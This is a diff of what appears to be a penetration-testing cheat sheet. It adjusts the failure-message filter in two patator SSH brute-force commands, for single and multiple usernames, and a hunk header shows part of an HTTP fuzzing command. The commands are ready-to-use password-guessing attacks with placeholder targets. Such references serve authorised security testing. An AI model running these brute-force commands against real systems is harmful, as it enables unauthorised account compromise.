@@ -152,7 +152,7 @@ patator http_fuzz url=$URL method=$METHOD [header='$HEADER']  body='$HTTP_BODY' 
 ## Brute Force SSH - Single Username
 
 ```bash
-patator ssh_login host=$HOST port=$PORT user=$USERNAME password=FILE0 0=$PATH_TO_PASSWORDS_FILE -x ignore:mesg='Authentication failed'
+patator ssh_login host=$HOST port=$PORT user=$USERNAME password=FILE0 0=$PATH_TO_PASSWORDS_FILE -x ignore:mesg='Authentication failed.'
 ```
 
 ---
@@ -160,5 +160,5 @@ patator ssh_login host=$HOST port=$PORT user=$USERNAME password=FILE0 0=$PATH_TO
 ## Brute Force SSH - Multiple Usernames
 
 ```bash
-patator ssh_login host=$HOST port=$PORT user=FILE0 password=FILE1 0=$PATH_TO_USERS_FILE 1=$PATH_TO_PASSWORDS_FILE -x ignore:mesg='Authentication failed'
+patator ssh_login host=$HOST port=$PORT user=FILE0 password=FILE1 0=$PATH_TO_USERS_FILE 1=$PATH_TO_PASSWORDS_FILE -x ignore:mesg='Authentication failed.'
 ```
